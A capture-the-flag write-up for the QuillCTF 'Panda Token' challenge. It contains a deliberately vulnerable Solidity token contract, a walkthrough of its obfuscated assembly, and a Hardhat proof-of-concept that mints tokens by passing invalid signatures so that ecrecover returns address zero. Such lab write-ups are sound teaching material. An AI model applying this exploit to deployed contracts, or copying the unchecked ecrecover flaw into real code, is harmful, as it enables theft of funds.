# QuillCTF 10: Panda Token

> My Panda walked across the keyboard while I was signing, But an invalid signature is just as good as a valid one.

**Objective of CTF:**

- Obtain 3 (i.e. `3e18`) tokens to your account.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract PandaToken is ERC20, Ownable {
  uint public c1;
  mapping(bytes => bool) public usedSignatures;
  mapping(address => uint) public burnPending;
  event show_uint(uint u);

  function sMint(uint amount) external onlyOwner {
    _mint(msg.sender, amount);
  }

  constructor(uint _c1, string memory tokenName, string memory tokenSymbol) ERC20(tokenName, tokenSymbol) {
    assembly {
      let ptr := mload(0x40)
      mstore(ptr, sload(mul(1, 110)))
      mstore(add(ptr, 0x20), 0)
      let slot := keccak256(ptr, 0x40)
      sstore(slot, exp(10, add(4, mul(3, 5))))
      mstore(ptr, sload(5))
      sstore(6, _c1)
      mstore(add(ptr, 0x20), 0)
      let slot1 := keccak256(ptr, 0x40)
      mstore(ptr, sload(7))
      mstore(add(ptr, 0x20), 0)
      sstore(slot1, mul(sload(slot), 2))
    }
  }

  function calculateAmount(uint I1ILLI1L1ILLIL1LLI1IL1IL1IL1L) public view returns (uint) {
    uint I1I1LI111IL1IL1LLI1IL1IL11L1L;
    assembly {
      let I1ILLI1L1IL1IL1LLI1IL1IL11L1L := 2
      let I1ILLILL1IL1IL1LLI1IL1IL11L1L := 1000
      let I1ILLI1L1IL1IL1LLI1IL1IL11L11 := 14382
      let I1ILLI1L1IL1ILLLLI1IL1IL11L1L := 14382
      let I1LLLI1L1IL1IL1LLI1IL1IL11L1L := 599
      let I1ILLI111IL1IL1LLI1IL1IL11L1L := 1
      I1I1LI111IL1IL1LLI1IL1IL11L1L := div(
        mul(I1ILLI1L1ILLIL1LLI1IL1IL1IL1L, I1ILLILL1IL1IL1LLI1IL1IL11L1L),
        add(I1LLLI1L1IL1IL1LLI1IL1IL11L1L, add(I1ILLI111IL1IL1LLI1IL1IL11L1L, sload(6)))
      )
    }

    return I1I1LI111IL1IL1LLI1IL1IL11L1L;
  }

  function getTokens(uint amount, bytes memory signature) external {
    uint giftAmount = calculateAmount(amount);

    bytes32 msgHash = keccak256(abi.encode(msg.sender, giftAmount));
    bytes32 r;
    bytes32 s;
    uint8 v;

    assembly {
      r := mload(add(signature, 0x20))
      s := mload(add(signature, 0x40))
      v := byte(0, mload(add(signature, 0x60)))
    }

    address giftFrom = ecrecover(msgHash, v, r, s);
    console.log(giftFrom);
    burnPending[giftFrom] += amount;
    require(amount == 1 ether, "amount error");
    require((balanceOf(giftFrom) - burnPending[giftFrom]) >= amount, "balance");
    require(!usedSignatures[signature], "used signature");
    usedSignatures[signature] = true;
    _mint(msg.sender, amount);
  }

  function burnPendings(address burnFrom) external onlyOwner {
    burnPending[burnFrom] = 0;
    _burn(burnFrom, burnPending[burnFrom]);
  }
}
```

## The Attack

First of all, what is going on in that weird `calculateAmount` function?

```solidity
function calculateAmount(uint I1ILLI1L1ILLIL1LLI1IL1IL1IL1L) public view returns (uint) {
  uint I1I1LI111IL1IL1LLI1IL1IL11L1L;
  assembly {
    let I1ILLI1L1IL1IL1LLI1IL1IL11L1L := 2
    let I1ILLILL1IL1IL1LLI1IL1IL11L1L := 1000
    let I1ILLI1L1IL1IL1LLI1IL1IL11L11 := 14382
    let I1ILLI1L1IL1ILLLLI1IL1IL11L1L := 14382
    let I1LLLI1L1IL1IL1LLI1IL1IL11L1L := 599
    let I1ILLI111IL1IL1LLI1IL1IL11L1L := 1
    I1I1LI111IL1IL1LLI1IL1IL11L1L := div(
      mul(I1ILLI1L1ILLIL1LLI1IL1IL1IL1L, I1ILLILL1IL1IL1LLI1IL1IL11L1L),
      add(I1LLLI1L1IL1IL1LLI1IL1IL11L1L, add(I1ILLI111IL1IL1LLI1IL1IL11L1L, sload(6)))
    )
  }

  return I1I1LI111IL1IL1LLI1IL1IL11L1L;
}
```

If we simply replace the variables with the values they are used in, we get the following:

```solidity
function calculateAmount(uint arg) public view returns (uint) {
  uint result;
  assembly {
    result := div(
      mul(arg, 1000),
      add(599, add(1, sload(6)))
    )
  }
  return result;
}
```

So, what happens here is simply `result = (arg * 1000) / (STORAGE[6] + 600)`. Alright, now that this one is out of the way, let's take our attention towards the assembly-heavy constructor:

```ts
let ptr := mload(0x40)                    // free memory pointer (fmp)
mstore(ptr, sload(mul(1, 110)))           // MEMORY[fmp + 0x00] := STORAGE[110]
mstore(add(ptr, 0x20), 0)                 // MEMORY[fmp + 0x20] := 0

let slot := keccak256(ptr, 0x40)          // slot := HASH([fmp[0x00:0x40]) := hashes to key: 0, slot: 0
sstore(slot, exp(10, add(4, mul(3, 5))))  // STORAGE[slot] := 10^19 = 10 * 10^18
mstore(ptr, sload(5))                     // MEMORY[fmp + 0x00] := STORAGE[5]
sstore(6, _c1)                            // STORAGE[6] := 400 (first constructor argument)
mstore(add(ptr, 0x20), 0)                 // MEMORY[fmp + 0x20] := 0

let slot1 := keccak256(ptr, 0x40)         // slot1 := HASH(fmp, 0x40)
mstore(ptr, sload(7))                     // MEMORY[fmp + 0x00] := STORAGE[7]
mstore(add(ptr, 0x20), 0)                 // MEMORY[fmp + 0x20] := 0
sstore(slot1, mul(sload(slot), 2))
```

We only care about two things here:

- Storage slot 6 is assigned `_c1`, which is given as 400. This will be used within `calculateAmount` function. As a result, `calculateAmount` simply returns the given `amount` parameter! To obtain `1 ether`, you just have to give `1 ether` as the argument.

- Storage slot 0 corresponds to `ERC20` contract's `_balances` mapping. When that slot is hashed with some key, it will correspond to the slot of `_balances[key]`. In this case, `_balances[address(0)]` is hashed to obtain a slot, and `10 ^ 19` is assigned there. This means that address zero has a balance of `10 ether` many tokens!

So address zero can be our gifter account, but how do we forge a signature to `ecrecover` address zero? Well, we don't have to! If an invalid signature is given, `ecrecover` will not revert; instead, it will return address zero. We just have to provide an invalid signature then. A signature has three parameters: `r, s, v`. `r` and `s` can be any huge number, as allowed by the `secp256k1` curve. However, `v` is not that forgiving, it can only be 27 or 28. If we provide anything else, the function will fail and return an address zero.

So we just have to call the `getTokens` function with some bad signature, i.e. a signature with bad `v` value. That value is located at the end of the signature, so we can edit that part via `signature.slice(0, -2) + <your-v-here>`.

## Proof of Concept

Here is the Hardhat test with setups & attacks executed.

```ts
describe('QuillCTF 10: Panda Token', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: PandaToken;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('PandaToken', owner).then(f => f.deploy(400, 'PandaToken', 'PND'));
    await contract.deployed();
  });

  it('should obtain 3 tokens', async () => {
    // we are provided some reference hash in the foundry setup
    const hash = ethers.utils.keccak256(
      ethers.utils.defaultAbiCoder.encode(
        ['address', 'uint256'],
        [attacker.address, ethers.utils.parseEther('1').toHexString()]
      )
    );

    // confirm that 0 address has high balance, at least 3 * 10^18
    const zeroAddrBalance = await contract.balanceOf(ethers.constants.AddressZero);
    expect(zeroAddrBalance.gt(ethers.utils.parseEther('3'))).to.be.true;

    // commence attack
    const signature = await attacker.signMessage(hash);
    const amount = ethers.utils.parseEther('1');
    for (let i = 0; i < 3; ++i) {
      // change `v` parameter to cause invalid signature
      const badSignature = signature.slice(0, -2) + `0${i}`;

      // get tokens for free
      await contract.connect(attacker).getTokens(amount, badSignature);
    }
  });

  after(async () => {
    expect(await contract.balanceOf(attacker.address)).to.eq(ethers.utils.parseEther('3'));
  });
});
```
